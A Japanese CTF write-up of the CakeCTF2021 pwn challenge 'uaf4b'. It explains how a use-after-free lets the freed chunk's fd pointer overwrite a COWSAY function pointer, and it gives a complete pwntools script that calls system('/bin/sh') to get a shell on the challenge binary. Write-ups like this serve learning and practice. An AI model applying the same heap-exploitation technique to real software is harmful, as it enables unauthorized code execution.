---
title: "uaf4b"
date: 2022-05-02T08:45:31+09:00
tags: ["pwn", "CakeCTF2021", "ptr-yudai's chall"]
draft: false
---

# uaf4b - CakeCTF2021

[uaf4b - CakeCTF2021(My solver)](https://github.com/yu1hpa/ctf-writeup/tree/master/2021/CakeCTF/uaf4b)

[uaf4b - CakeCTF2021(Official GitHub)](https://github.com/theoremoon/cakectf-2021-public/tree/master/pwn/uaf4b)

# 方針
Use after Free によって関数ポインタを`system`関数で書き換える。

### CAWSAY 構造体について
重要なのは、`main.c`の47〜50行目の構造体である。

freed chunkでは、`fn_dialogue`が`fd`、`message`が`bk`に割り当てられる。
```c
typedef struct {
  void (*fn_dialogue)(char*);
  char *message;
} COWSAY;
```

また、`main.c`の167〜171行目で、
`cowsay->fn_dialogue(cowsay->message);`が実行されることに留意しておく。
```
case 1:
  /* Use cowsay */
  printf("[+] You're trying to call 0x%016lx\n", (addr)cowsay->fn_dialogue);
  cowsay->fn_dialogue(cowsay->message);
  break;
```

### malloced chunk
実際にmallocされたときのHeap領域は次の図のようになっている。

[![mallocedchunk](https://i.gyazo.com/f3ef9ad8fe8cc16b6db4e9b59e3347d3.png)](https://gyazo.com/f3ef9ad8fe8cc16b6db4e9b59e3347d3)

### freed chunk
次に、freeすると、次の図のようになる。

[![freedchunk](https://i.gyazo.com/dcb349b359e86031b4d3575a85de9b8e.png)](https://gyazo.com/dcb349b359e86031b4d3575a85de9b8e)

### system("/bin/sh")を呼び出す
この2つの図を見るとわかるように、関数ポインタ`fn_dialogue`の位置に`fd`が割り当てられている。
つまり、`fn_dialogue`を`system`に、`COWSAY->message = /bin/sh`にすれば、
`system("/bin/sh")`が呼び出される。

# Solver
```python
from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process("./chall")

io.recvuntil("<system> = ")
system_addr = int(io.recvline(), 16)

io.sendlineafter("> ", "2")
io.sendlineafter("Message: ", "/bin/sh")

io.sendlineafter("> ", "4")
io.recvuntil("cowsay->message")
message_addr = int(io.recvuntil("|")[:16], 16)
print(f'{message_addr:x}')

io.sendlineafter("> ", "3") # free
io.sendlineafter("> ", "2")     # fd ↓               # bk ↓
io.sendlineafter("Message: ", p64(system_addr) + p64(message_addr)) # system(/bin/sh)

io.sendlineafter("> ", "4")
io.sendlineafter("> ", "1")

io.interactive()
````

### 最終的なHeap領域

[![Image from Gyazo](https://i.gyazo.com/ea4b3c9b6166f1d35070ebe0823a9922.png)](https://gyazo.com/ea4b3c9b6166f1d35070ebe0823a9922)


